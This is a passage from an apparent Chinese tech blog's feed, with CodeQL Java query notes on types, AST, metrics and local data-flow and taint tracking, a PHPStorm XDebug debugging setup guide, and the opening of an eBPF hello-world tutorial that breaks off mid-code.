fa-external-link-alt"></i></a></li></ul></li></ul><p>最后，该库还有许多封装了常用的 Java 标准库类的单例类：</p><p><code>TypeObject</code>、<code>TypeCloneable</code>、<code>TypeRuntime</code>、<code>TypeSerializable</code>、<code>TypeString</code>、<code>TypeSystem</code> 和 <code>TypeClass</code></p><p>例如，我们可以编写一个查询，查找直接继承 <code>Object</code> 的所有嵌套类：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from NestedClass nc  where nc.getASupertype() instanceof TypeObject  select nc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Type.qll/predicate.Type$RefType$getASupertype.0.html" >RefType::getASupertype<i class="fas fa-external-link-alt"></i></a>：<code>RefType getASupertype()</code>，获取此类型的直接超类</p><h5 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h5><p><code>Type</code> 还有几个子类用于处理泛型类型<br><code>GenericType</code> 代表 <code>GenericInterface</code> 或 <code>GenericClass</code>，它表示一个泛型类型声明，比如 <code>java.util.Map</code> 接口</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">package java.util.;    public interface Map&lt;K, V&gt; &#123;      int size();        &#x2F;&#x2F; ...  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>类型参数，如本例中的 <code>K</code> 和 <code>V</code>，由类 <code>TypeVariable</code> 表示</p><p>泛型类型的参数化实例提供了一个具体类型来实例化类型参数，如 <code>Map&lt;String, File&gt;</code> 中所示。这样的类型由 <code>ParameterizedType</code> 表示，它不同于表示其实例化来源的泛型类型 <code>GenericType</code>。要从 <code>ParameteredType</code> 转换为相应的 <code>GenericType</code>，可以使用谓词 <code>getSourceDeclaration</code>。</p><p>例如，我们可以使用下面的查询来查找所有 <code>java.util.Map</code> 的参数化实例：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from GenericInterface map, ParameterizedType pt  where map.hasQualifiedName(&quot;java.util&quot;, &quot;Map&quot;)       and pt.getSourceDeclaration() &#x3D; map  select pt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h5><p>类 <code>Variable</code> 表示 <a class="link"   href="https://docs.oracle.com/javase/tutorial/java/nutsandbolts/variables.html" >Java意义上<i class="fas fa-external-link-alt"></i></a> 的变量，它要么是类的成员字段（无论是静态的还是非静态的），要么是局部变量，要么是参数。所以针对这些特殊情况，有三个子类：</p><ul><li><code>Field</code> 表示一个Java字段</li><li><code>LocalVariableDecl</code> 表示局部变量</li><li><code>Parameter</code> 表示方法或构造函数的参数</li></ul><h4 id="抽象语法树"><a href="#抽象语法树" class="headerlink" title="抽象语法树"></a>抽象语法树</h4><p>此类别中的类表示抽象语法树（AST）节点，即语句（类<code>Stmt</code>）和表达式（类<code>Expr</code>）。有关标准QL库中可用的表达式和语句类型的完整列表，见<a class="link"   href="https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#%E7%94%A8%E4%BA%8E%E5%A4%84%E7%90%86Java%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91%E7%B1%BB" >用于处理Java程序的抽象语法树类<i class="fas fa-external-link-alt"></i></a></p><p><code>Expr</code>和<code>Stmt</code>都提供了成员谓词，用于探索程序的抽象语法树：</p><ul><li><code>Expr.getAChildExpr</code> 返回给定表达式的子表达式</li><li><code>Stmt.getAChild</code> 返回直接嵌套在给定语句中的语句或表达式</li><li><code>Expr.getParent</code> 和 <code>Stmt.getParent</code> 返回AST节点的父节点</li></ul><p>例如，以下查询将查找所有父级为<code>return</code>语句的表达式：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from Expr e  where e.getParent() instanceof ReturnStmt  select e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以下查询查找父级为 <code>if</code> 语句的语句（将查找程序中所有 <code>if</code> 语句的 <code>then</code> 分支和 <code>else</code> 分支）：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from Stmt s  where s.getParent() instanceof IfStmt  select s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后，这是一个查找方法体的查询：</p><p>正如这些示例所示，表达式的父节点并不总是表达式：它也可能是语句，例如 <code>IfStmt</code>。类似地，语句的父节点并不总是一个语句：它也可能是一个方法或构造函数。为了解决这个问题，QL Java 库提供了两个抽象类 <code>ExprParent</code> 和 <code>StmtParent</code>，前者表示可能是表达式父节点的任何节点，后者表示可能是语句父节点的任何节点</p><p>有关使用 AST 类的更多信息，见 <a class="link"   href="https://l3yx.github.io/2022/03/05/CodeQL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#Java%E4%B8%AD%E5%AE%B9%E6%98%93%E6%BA%A2%E5%87%BA%E7%9A%84%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97" >Java中容易溢出的比较运算<i class="fas fa-external-link-alt"></i></a></p><h4 id="元数据"><a href="#元数据" class="headerlink" title="元数据"></a>元数据</h4><p>除了程序代码之外，Java 程序还有几种元数据。特别是有<a class="link"   href="https://docs.oracle.com/javase/tutorial/java/annotations/" >注解<i class="fas fa-external-link-alt"></i></a>和<a class="link"   href="https://en.wikipedia.org/wiki/Javadoc" >Javadoc<i class="fas fa-external-link-alt"></i></a>注释。由于此元数据对于增强代码分析和作为分析主题本身都很有趣，因此 QL 库定义了用于访问它的类</p><p>对于注解，类 <code>Annotatable</code> 是所有可注解的程序元素的超类。包括包、引用类型、字段、方法、构造函数和局部变量声明。对于每一个这样的元素，其谓词 <code>getAnAnnotation</code> 能检索该元素可能具有的任何注解。例如，以下查询查找构造函数上的所有注解：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from Constructor c  select c.getAnAnnotation()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这些注解由类 <code>Annotation</code> 表示。注解只是类型为 <code>AnnotationType</code> 的表达式。例如，可以修改此查询，使其只报告 <code>Deprecated</code> 的构造函数</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from Constructor c, Annotation ann, AnnotationType anntp  where ann &#x3D; c.getAnAnnotation() and      anntp &#x3D; ann.getType() and      anntp.hasQualifiedName(&quot;java.lang&quot;, &quot;Deprecated&quot;)  select ann<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有关使用注解的更多信息，见本文 Java 中的注解</p><p>对于 Javadoc，类 <code>Element</code> 有一个成员谓词 <code>getDoc</code>，它返回一个委派的 <code>Documentable</code> 的对象，然后可以查询它附加的 Javadoc 注释。例如，以下查询在私有字段上查找 Javadoc 注释：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import javafrom Field f, Javadoc jdocwhere f.isPrivate() and    jdoc &#x3D; f.getDoc().getJavadoc()select jdoc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>类 <code>Javadoc</code> 将整个 Javadoc 注释表示为 <code>JavadocElement</code> 节点树，可以使用成员谓词 <code>getAChild</code> 和 <code>getParent</code> 遍历这些节点。例如，你可以编辑查询，以便在私有字段的 Javadoc 注释中找到所有 <code>@author</code> 标签：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from Field f, Javadoc jdoc, AuthorTag at  where f.isPrivate() and      jdoc &#x3D; f.getDoc().getJavadoc() and      at.getParent+() &#x3D; jdoc  select at<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a class="link"   href="https://codeql.github.com/docs/ql-language-reference/recursion/" >Recursion — CodeQL<i class="fas fa-external-link-alt"></i></a></p></blockquote><p>有关使用 Javadoc 的更多信息，见 Javadoc</p><h4 id="度量"><a href="#度量" class="headerlink" title="度量"></a>度量</h4><p>标准的 QL Java 库为计算 Java 程序元素的度量提供了广泛的支持。为了避免与度量计算相关的成员谓词过多而给代表这些元素的类造成过重的负担，这些谓词被放在委托类上</p><p>总共有六个这样的类：<code>MetricElement</code>、<code>MetricPackage</code>、<code>MetricRefType</code>、<code>MetricField</code>、<code>MetricCallable</code> 和 <code>MetricStmt</code>。相应的元素类各自提供一个成员谓词 <code>getMetrics</code>，可用于获取委托类的实例，然后在这个实例上进行度量计算。例如，以下查询查找 <a class="link"   href="https://en.wikipedia.org/wiki/Cyclomatic_complexity" >圈复杂度<i class="fas fa-external-link-alt"></i></a>大于 5 的方法</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import javafrom Method m, MetricCallable mcwhere mc &#x3D; m.getMetrics() and    mc.getCyclomaticComplexity() &gt; 5select m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="调用图"><a href="#调用图" class="headerlink" title="调用图"></a>调用图</h4><p>从 Java 代码生成的 CodeQL 数据库包含有关程序调用图的预计算信息，即给定调用在运行时可以分派给哪些方法或构造函数。</p><p>前文介绍的 <code>Callable</code> 类，它包括方法，也包括构造函数。调用表达式是使用类<code>Call</code>来进行抽象的，它包括方法调用、<code>new</code> 表达式和使用 <code>this</code> 或 <code>super</code> 的显式构造函数调用</p><p>我们可以使用谓词 <code>Call.getCallee</code> 来查找一个特定的调用表达式所指向的方法或构造函数。例如，以下查询查找名为 <code>println</code> 的方法的所有调用：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from Call c, Method m  where m &#x3D; c.getCallee() and      m.hasName(&quot;println&quot;)  select c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>相反， <code>Callable.getAReference</code> 返回指向它的 <code>Call</code> 。所以我们可以使用这个查询找到从未被调用的方法或构造函数：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import javafrom Callable cwhere not exists(c.getAReference())select c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有关可调用项和调用的更多信息，见导航调用图</p><h2 id="0x05-Java-中的数据流分析"><a href="#0x05-Java-中的数据流分析" class="headerlink" title="0x05 Java 中的数据流分析"></a>0x05 Java 中的数据流分析</h2><p>数据流分析用于计算一个变量在程序中各个点上可能保持的值，确定这些值如何在程序中传播以及它们的使用位置</p><h3 id="局部数据流"><a href="#局部数据流" class="headerlink" title="局部数据流"></a>局部数据流</h3><p>局部数据流是单个方法内或可调用内的数据流。局部数据流通常比全局数据流更容易、更快、更精确，并且对于许多查询来说已经足够了</p><h4 id="使用局部数据流"><a href="#使用局部数据流" class="headerlink" title="使用局部数据流"></a>使用局部数据流</h4><p>局部数据流库位于 <code>DataFlow</code> 模块中，该模块定义了类 <code>Node</code> 来表示数据可以通过的任意元素。<code>Node</code> 分为表达式节点（<code>ExprNode</code>）和参数节点（<code>ParameterNode</code>）。可以使用成员谓词 <code>asExpr</code> 和 <code>asParameter</code> 在数据流节点和表达式&#x2F;参数之间映射：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">class Node &#123;    &#x2F;** Gets the expression corresponding to this node, if any. *&#x2F;    Expr asExpr() &#123; ... &#125;      &#x2F;** Gets the parameter corresponding to this node, if any. *&#x2F;    Parameter asParameter() &#123; ... &#125;      ...  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者使用谓词 <code>exprNode</code> 和 <code>parameterNode</code></p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">&#x2F;**   * Gets the node corresponding to expression &#96;e&#96;.   *&#x2F;  ExprNode exprNode(Expr e) &#123; ... &#125;    &#x2F;**   * Gets the node corresponding to the value of parameter &#96;p&#96; at function entry.   *&#x2F;  ParameterNode parameterNode(Parameter p) &#123; ... &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果存在一条从节点 <code>nodeFrom</code> 到节点 <code>nodeTo</code> 的实时数据流边，则谓词 <code>localFlowStep(Node nodeFrom, Node nodeTo)</code> 成立。可以通过使用<code>+</code>或<code>*</code>运算符来递归地应用 <code>localFlowStep</code>，或者通过使用预定义的递归谓词 <code>localFlow</code>（相当于 <code>localFlowStep*</code>）</p><p>例如，可以在零个或多个局部步骤中找到从参数 <code>source</code> 到表达式 <code>sink</code> 的流：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">DataFlow::localFlow(DataFlow::parameterNode(source), DataFlow::exprNode(sink))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用局部污点跟踪"><a href="#使用局部污点跟踪" class="headerlink" title="使用局部污点跟踪"></a>使用局部污点跟踪</h4><p>局部污点跟踪通过包含非保值流步骤来扩展局部数据流。例如：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">String temp &#x3D; x;  String y &#x3D; temp + &quot;, &quot; + temp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果 <code>x</code> 是污点字符串，那么 <code>y</code> 也是污点</p><p>局部污点跟踪库位于 <code>TaintTracking</code> 模块中。与局部数据流一样，如果存在一条从节点 <code>nodeFrom</code> 到节点 <code>nodeTo</code> 的实时污染传播边，则谓词 <code>localTaintStep(DataFlow::Node nodeFrom, DataFlow::Node nodeTo)</code> 成立。可以使用 <code>+</code> 和 <code>*</code> 运算符递归地应用谓词，或者使用预定义的递归谓词 <code>localTaint</code>（相当于 <code>localTaintStep*</code>）</p><p>例如，可以在零个或多个局部步骤中找到从参数 <code>source</code> 到表达式 <code>sink</code> 的污染传播：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">TaintTracking::localTaint(DataFlow::parameterNode(source), DataFlow::exprNode(sink))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>此查询查找传递给新 <code>new FileReader(..)</code> 的文件名</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java    from Constructor fileReader, Call call  where    fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and    call.getCallee() &#x3D; fileReader  select call.getArgument(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Member.qll/predicate.Member$Member$getDeclaringType.0.html" >Member::getDeclaringType<i class="fas fa-external-link-alt"></i></a>：<code>RefType getDeclaringType()</code>，获取定义此成员的类型</p><p>但这只给出参数中的表达式，而不是可以传递给它的值。所以我们使用局部数据流来查找流入参数的所有表达式</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import javaimport semmle.code.java.dataflow.DataFlowfrom Constructor fileReader, Call call, Expr srcwhere  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and  call.getCallee() &#x3D; fileReader and  DataFlow::localFlow(DataFlow::exprNode(src), DataFlow::exprNode(call.getArgument(0)))select src<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们可以使源更加具体，例如对一个公共参数的访问。此查询查找将公共参数传递给 <code>new FileReader(..)</code> 的位置：</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import javaimport semmle.code.java.dataflow.DataFlowfrom Constructor fileReader, Call call, Parameter pwhere  fileReader.getDeclaringType().hasQualifiedName(&quot;java.io&quot;, &quot;FileReader&quot;) and  call.getCallee() &#x3D; fileReader and  DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(call.getArgument(0)))select p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此查询查找对格式字符串没有硬编码的格式化函数的调用</p><pre class="line-numbers language-ql" data-language="ql"><code class="language-ql">import java  import semmle.code.java.dataflow.DataFlow  import semmle.code.java.StringFormat    from StringFormatMethod format, MethodAccess call, Expr formatString  where  call.getMethod() &#x3D; format and  call.getArgument(format.getFormatStringIndex()) &#x3D; formatString and  not exists(DataFlow::Node source, DataFlow::Node sink |  DataFlow::localFlow(source, sink) and  source.asExpr() instanceof StringLiteral and  sink.asExpr() &#x3D; formatString  )  select call, &quot;Argument to String format method isn&#39;t hard-coded.&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a class="link"   href="https://codeql.github.com/docs/ql-language-reference/formulas/#exists" >exists<i class="fas fa-external-link-alt"></i></a>：<code>exists(&lt;variable declarations&gt; | &lt;formula&gt;)</code>。还可以写作<code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; | &lt;formula 2&gt;)</code>，相当于 <code>exists(&lt;variable declarations&gt; | &lt;formula 1&gt; and &lt;formula 2&gt;)</code>。这个函数引入了一些新的变量，如果变量至少有一组值可以使主体中的公式为真，则该函数成立。例如， <code>exists(int i | i instanceof OneTwoThree)</code> 引入<code>int</code>类型的临时变量<code>i</code>，如果<code>i</code>的任何值是<code>OneTwoThree</code>类型，则函数成立</p><p><a class="link"   href="https://codeql.github.com/codeql-standard-libraries/java/semmle/code/java/Expr.qll/type.Expr$StringLiteral.html" >StringLiteral<i class="fas fa-external-link-alt"></i></a>：<code>Class StringLiteral</code>，字符串文本或文本块（Java 15特性）</p><h5 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h5><p>练习1：使用局部数据流编写一个查询，查找所有用于创建 <code>java.net.URL</code> 的硬编码字符串</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;codeql 学习记录&lt;/p&gt;</summary>
    
    
    
    <category term="ql" scheme="https://drun1baby.github.io/categories/ql/"/>
    
    
    <category term="ql" scheme="https://drun1baby.github.io/tags/ql/"/>
    
  </entry>
  
  <entry>
    <title>PHPStorm 本地 Debug 配置</title>
    <link href="https://drun1baby.github.io/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/"/>
    <id>https://drun1baby.github.io/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/</id>
    <published>2023-07-19T06:24:11.000Z</published>
    <updated>2023-07-19T09:05:23.368Z</updated>
    
    <content type="html"><![CDATA[<p>其实算是很早就应该记录的内容，一直被我拖着了</p><span id="more"></span><h1 id="PHPStorm-本地-Debug-配置"><a href="#PHPStorm-本地-Debug-配置" class="headerlink" title="PHPStorm 本地 Debug 配置"></a>PHPStorm 本地 Debug 配置</h1><p>文章内容主要摘自 oatmeal 师傅的博客 <a class="link"   href="https://oatmeal.vip/tools/phpstudyphpstormxdebug/" >https://oatmeal.vip/tools/phpstudyphpstormxdebug/<i class="fas fa-external-link-alt"></i></a></p><h2 id="XDebug-是如何工作的？"><a href="#XDebug-是如何工作的？" class="headerlink" title="XDebug 是如何工作的？"></a>XDebug 是如何工作的？</h2><h3 id="IDE-结合-XDebug-调试原理"><a href="#IDE-结合-XDebug-调试原理" class="headerlink" title="IDE 结合 XDebug 调试原理"></a>IDE 结合 XDebug 调试原理</h3><ul><li>IDE 行为：打开本地端口（XDebug 2.X 默认为 9000，3.X 默认为 9003）进行监听；同时做好路径映射，将本地的项目与远程服务器的项目目录做一一映射。</li><li>浏览器行为：向服务器发起请求，Headers 中带上 <code>Cookie：XDEBUG_SESSION=IDEKEY</code></li><li>服务器行为：检测到 Cookie，挂起PHP解释器，等待进一步请求；同时获取请求的来源地址，发起对对方端口（此端口与监听端口一致）的访问，建立调试连接。</li><li>IDE 行为：发现有调试连接建立，判断 <code>XDEBUG_SESSION</code> 是否为预设的 IDE key，如果是，双方协商，进入调试状态。</li></ul><h3 id="为什么-Debug-这么难？"><a href="#为什么-Debug-这么难？" class="headerlink" title="为什么 Debug 这么难？"></a>为什么 Debug 这么难？</h3><p>习惯了 Pycharm 和 CLion 的直接虫子 Debug，可能对 PHP 为何如此难用 Debug 感到困惑，这里借了Clang 佬的一张图（来自某年 XMAN）：</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/clangDebug.png" class=""><p>可以看到整个流程中存在三方角色：本地的负责调试客户端的 PhpStrom，提交请求触发调试的浏览器（例如 Chrome）以及安装了 XDebug 等待被调试 PHP 服务器 Apache&#x2F;Nginx 等（这部分在 Windows 下使用 PHPStudy 实现）。三者都存在于本机中，于是会使人产生了在本地调试的错觉。其中最大的区别是 php 解析器是被 apache&#x2F;nginx 等中间件调用，phpstorm 需要经过中间件与调试的 php 代码进行通信，本质上是一种远程调试，而 XDebug 就是实现的插件。</p><h2 id="XDebug-下载与配置"><a href="#XDebug-下载与配置" class="headerlink" title="XDebug 下载与配置"></a>XDebug 下载与配置</h2><p>这里 PHPStudy 其实已经带有了 XDebug，所以在 PHPStudy 里面去做</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/debug.png" class=""><p>在 php.ini 里面配置 xdebug 的内容</p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">Xdebug</span><span class="token punctuation">]</span></span><span class="token key attr-name">xdebug.idekey</span><span class="token punctuation">=</span><span class="token value attr-value">PHPSTORM</span><span class="token key attr-name">zend_extension</span><span class="token punctuation">=</span><span class="token value attr-value">D:/phpstudy_pro/Extensions/php/php7.4.3nts/ext/php_xdebug.dll</span><span class="token key attr-name">xdebug.collect_params</span><span class="token punctuation">=</span><span class="token value attr-value">1</span><span class="token key attr-name">xdebug.collect_return</span><span class="token punctuation">=</span><span class="token value attr-value">1</span><span class="token key attr-name">xdebug.auto_trace</span><span class="token punctuation">=</span><span class="token value attr-value">Off</span><span class="token key attr-name">xdebug.trace_output_dir</span><span class="token punctuation">=</span><span class="token value attr-value">D:/phpstudy_pro/Extensions/php_log/php7.4.3nts.xdebug.trace</span><span class="token key attr-name">xdebug.profiler_enable</span><span class="token punctuation">=</span><span class="token value attr-value">Off</span><span class="token key attr-name">xdebug.profiler_output_dir</span><span class="token punctuation">=</span><span class="token value attr-value">D:/phpstudy_pro/Extensions/php_log/php7.4.3nts.xdebug.profiler</span><span class="token key attr-name">xdebug.remote_enable</span><span class="token punctuation">=</span><span class="token value attr-value">On</span><span class="token key attr-name">xdebug.remote_host</span><span class="token punctuation">=</span><span class="token value attr-value">localhost</span><span class="token key attr-name">xdebug.remote_port</span><span class="token punctuation">=</span><span class="token value attr-value">9000</span><span class="token key attr-name">xdebug.remote_handler</span><span class="token punctuation">=</span><span class="token value attr-value">dbgp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后重启服务器，访问 phpinfo，可以看到已经有 Xdebug 了。</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/XdebugExists.png" class=""><h2 id="PHPStorm-开启监听"><a href="#PHPStorm-开启监听" class="headerlink" title="PHPStorm 开启监听"></a>PHPStorm 开启监听</h2><p>PhpStorm 的配置不用做太大的变化，默认也是开启了 Debug 的，匹配一下端口就行了。</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/port9000.png" class=""><p>设置监听的服务器信息</p><p>Debug → DBGp Proxy，这里是设置 IDE key 以及监听 host 和 port 信息的，这里注意和 <code>php.ini</code> 的属性保持一致即可。</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/DBGpProxy.png" class=""><p>再配置 Web Page</p><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/webPage.png" class=""><p>点击上面那只小虫子，是一个打电话的形式，这就开启了监听。</p><h2 id="配置-xdebug-helper-插件"><a href="#配置-xdebug-helper-插件" class="headerlink" title="配置 xdebug helper 插件"></a>配置 xdebug helper 插件</h2><img src="/2023/07/19/PHPStorm-%E6%9C%AC%E5%9C%B0-Debug-%E9%85%8D%E7%BD%AE/PHPSTORMKey.png" class=""><p>这样子的话，就可以直接在开启监听的情况下，通过插件来做调试的开启与否。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;其实算是很早就应该记录的内容，一直被我拖着了&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://drun1baby.github.io/categories/PHP/"/>
    
    
    <category term="PHP" scheme="https://drun1baby.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 的基本使用</title>
    <link href="https://drun1baby.github.io/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"/>
    <id>https://drun1baby.github.io/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/</id>
    <published>2023-07-04T02:11:14.000Z</published>
    <updated>2023-08-06T02:26:40.180Z</updated>
    
    <content type="html"><![CDATA[<p>eBPF 的基本使用，eBPF 学习（一）</p><span id="more"></span><h1 id="eBPF-的基础使用"><a href="#eBPF-的基础使用" class="headerlink" title="eBPF 的基础使用"></a>eBPF 的基础使用</h1><h2 id="eBPF-简介：安全和有效地扩展内核"><a href="#eBPF-简介：安全和有效地扩展内核" class="headerlink" title="eBPF 简介：安全和有效地扩展内核"></a>eBPF 简介：安全和有效地扩展内核</h2><p>eBPF 是一项革命性的技术，起源于 Linux 内核，可以在操作系统的内核中运行沙盒程序。它被用来安全和有效地扩展内核的功能，而不需要改变内核的源代码或加载内核模块。eBPF 通过允许在操作系统内运行沙盒程序，应用程序开发人员可以在运行时，可编程地向操作系统动态添加额外的功能。然后，操作系统保证安全和执行效率，就像在即时编译（JIT）编译器和验证引擎的帮助下进行本地编译一样。eBPF 程序在内核版本之间是可移植的，并且可以自动更新，从而避免了工作负载中断和节点重启。</p><p>今天，eBPF 被广泛用于各类场景：在现代数据中心和云原生环境中，可以提供高性能的网络包处理和负载均衡；以非常低的资源开销，做到对多种细粒度指标的可观测性，帮助应用程序开发人员跟踪应用程序，为性能故障排除提供洞察力；保障应用程序和容器运行时的安全执行，等等。可能性是无穷的，而 eBPF 在操作系统内核中所释放的创新才刚刚开始。</p><h2 id="eBPF-的简单使用"><a href="#eBPF-的简单使用" class="headerlink" title="eBPF 的简单使用"></a>eBPF 的简单使用</h2><ul><li>编写一个 helloworld 程序</li></ul><p>安装对应的开发工具</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># For Ubuntu20.10+sudo apt-get install -y make clang llvm libelf-dev libbpf-dev bpfcc-tools libbpfcc-dev linux-tools-$(uname -r) linux-headers-$(uname -r)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在开发 eBPF 程序之前，我们先来看一下 eBPF 的开发和执行过程。一般来说，这个过程分为以下 5 步：</p><p>第一步，使用 C 语言开发一个 eBPF 程序；</p><p>第二步，借助 LLVM 把 eBPF 程序编译成 BPF 字节码；</p><p>第三步，通过 bpf 系统调用，把 BPF 字节码提交给内核；</p><p>第四步，内核验证并运行 BPF 字节码，并把相应的状态保存到 BPF 映射中；</p><p>第五步，用户程序通过 BPF 映射查询 BPF 字节码的运行状态。</p><img src="/2023/07/04/eBPF-%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/eBPFRoutine.png" class=""><p>这里我们使用 bcc 来开发 eBPF 程序，如果使用 bcc 来开发 eBPF 程序的话，可以将前面所说的五步简化为三步</p><h3 id="第一步：使用-C-开发一个-eBPF-程序"><a href="#第一步：使用-C-开发一个-eBPF-程序" class="headerlink" title="第一步：使用 C 开发一个 eBPF 程序"></a>第一步：使用 C 开发一个 eBPF 程序</h3><ul><li>新建一个  <code>hello.c</code>  文件，并输入下面的内容：</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>ctx<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">bpf_trace_printk</span><span class="token punctuation">(</span><span class="token string">"Hello, World!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出 Hello，World，由于是在内核中进行运行所以结果输出到内核调试文件 <code>/sys/kernel/debug/tracing/trace_pipe</code></p><h3 id="第二步：使用-Python-和-BCC-库开发一个用户态程序"><a href="#第二步：使用-Python-和-BCC-库开发一个用户态程序" class="headerlink" title="第二步：使用 Python 和 BCC 库开发一个用户态程序"></a>第二步：使用 Python 和 BCC 库开发一个用户态程序</h3><p>接下来，创建一个 hello.py 文件，并输入下面的内容</p><pre class="line-numbers language-python" data-language="python"><code 